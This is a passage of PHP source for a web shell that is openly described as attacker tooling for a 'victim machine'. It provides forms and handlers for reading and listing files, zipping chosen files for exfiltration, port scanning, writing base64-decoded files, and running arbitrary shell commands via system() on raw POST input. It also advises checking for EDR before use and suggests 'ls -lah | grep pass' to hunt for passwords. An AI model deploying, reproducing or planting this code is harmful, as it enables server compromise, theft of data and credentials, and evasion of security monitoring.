                                $page === FILE_EXTRACTION_PREVIEW
                                    ? "window.location.href = '?page=" .
                                      FILE_EXTRACTION .
                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                    : "window.location.href = '?page=" .
                                      FILE_EXTRACTION_PREVIEW .
                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                            ),
                            makeCheckbox(
                                "__PARAM_3__",
                                "Export",
                                "Export the file even if larger than 100kb."
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
        case DIRECTORY_LISTING:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/directory or \\\\network\\path\\to\\directory",
                                "Fully qualified path to the directory to list.",
                                true
                            ),
                            makeInput(
                                "text",
                                "Depth",
                                "__PARAM_2__",
                                "5",
                                "How many levels deep to list, where " . makeCodeHighlight(0) .
                                " is the current directory and " . makeCodeHighlight("inf") .
                                " means to list all.",
                                true
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
        case EXFILTRATE:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "textarea",
                                "Paths",
                                "__PARAM_1__",
                                "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
                                "List of file/folders to include in the zip archive.<br/>" .
                                "Concatenate to the path " . makeCodeHighlight(",with_tree") .
                                " to include all files and folders within a given directory.<br/>" .
                                "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
                                " to include only files with the given extensions.",
                                true
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
        case PORT_SCAN:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "text",
                                "Host",
                                "__PARAM_1__",
                                "localhost",
                                "The host to connect to",
                                true
                            ),
                            makeInput(
                                "number",
                                "Starting port",
                                "__PARAM_2__",
                                "1",
                                "Starting port of the scan (included)",
                                true
                            ),
                            makeInput(
                                "number",
                                "Ending port",
                                "__PARAM_3__",
                                "65535",
                                "Ending port of the scan (included)",
                                true
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
        case WRITE_FILE:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/file.txt",
                                "Fully qualified path where the file will be written.",
                                true
                            ),
                            makeInput(
                                "textarea",
                                "File content",
                                "__PARAM_2__",
                                "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
                                "Content of the file to write to disk.",
                                true
                            ),
                            makeCheckbox(
                                "__PARAM_3__",
                                "Decode from base64",
                                "Decode the content of the file from base64 before writing it to disk."
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
        case RUN_COMMAND:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeAlert(
                        "Running system commands",
                        "Running system commands results in the creation of a child process from the 
                        webserver/php process (aka a new terminal is spawned), this behaviour as you may expect can be 
                        easily detected by EDR and other security solutions.
                        <br/>
                        If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
                        victim machine and ensure that there is no security solution running before using this module."
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "textarea",
                                "Command",
                                "__PARAM_1__",
                                "ls -lah | grep pass",
                                "Command to run through the default system shell. This can be used to establish a full duplex tunnel between the attacker and the victim machine.",
                                true
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
    }

    echo $content;

    if (isPost() && in_array($_POST["__OPERATION__"], $isolated_ops) && $_POST["__OPERATION__"] !== LOGIN) {
        openCommandOutputScreen();
    }
}

if (isPost()) {
    $operation = $_POST["__OPERATION__"];

    switch ($operation) {
        case LOGIN:
            handleLogin();
            break;
        case FILE_EXTRACTION_PREVIEW:
        case FILE_EXTRACTION:
            handleFileExtraction();
            break;
        case DIRECTORY_LISTING:
            handleDirectoryListing();
            break;
        case EXFILTRATE:
            handleCreateZip();
            break;
        case PORT_SCAN:
            handlePortScan();
            break;
        case WRITE_FILE:
            handleWriteFile();
            break;
        case RUN_COMMAND:
            system($_POST["__PARAM_1__"]);
            break;
        default:
            echo "Unrecognized operation '$operation'";
            break;
    }
}

// Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
if (!isPost() &&
    (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops)) &&
    $_POST["__OPERATION__"] !== LOGIN) {
    closeCommandOutputScreen();
}
?>